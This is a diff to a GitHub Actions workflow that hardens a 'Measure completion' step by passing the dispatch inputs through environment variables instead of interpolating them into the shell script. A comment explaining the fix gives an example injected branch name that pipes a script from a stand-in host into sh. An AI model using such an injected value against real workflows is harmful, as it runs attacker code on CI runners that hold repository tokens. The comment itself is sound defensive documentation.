@@ -53,11 +53,19 @@ jobs:
       - name: Self-test the reader first
         run: pnpm test:ci-completion
 
-      - name: Measure completion on ${{ inputs.branch || 'main' }}
+      - name: Measure completion
+        # THE INPUTS GO THROUGH `env`, NEVER INTO THE SCRIPT TEXT. `${{ }}` is
+        # substituted before the shell ever sees the line, so interpolating a
+        # workflow_dispatch input directly into `run:` makes a branch name like
+        #   "; curl evil.sh | sh; #
+        # execute as a command. Semgrep's run-shell-injection rule caught this
+        # in the first version of this very file.
+        #
+        # As `$BRANCH` the value is only ever an argument, whatever it contains.
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          BRANCH: ${{ inputs.branch || 'main' }}
+          LIMIT: ${{ inputs.limit || '60' }}
         run: |
           set -euo pipefail
-          pnpm ci:completion \
-            --branch "${{ inputs.branch || 'main' }}" \
-            --limit "${{ inputs.limit || '60' }}"
+          pnpm ci:completion --branch "$BRANCH" --limit "$LIMIT"
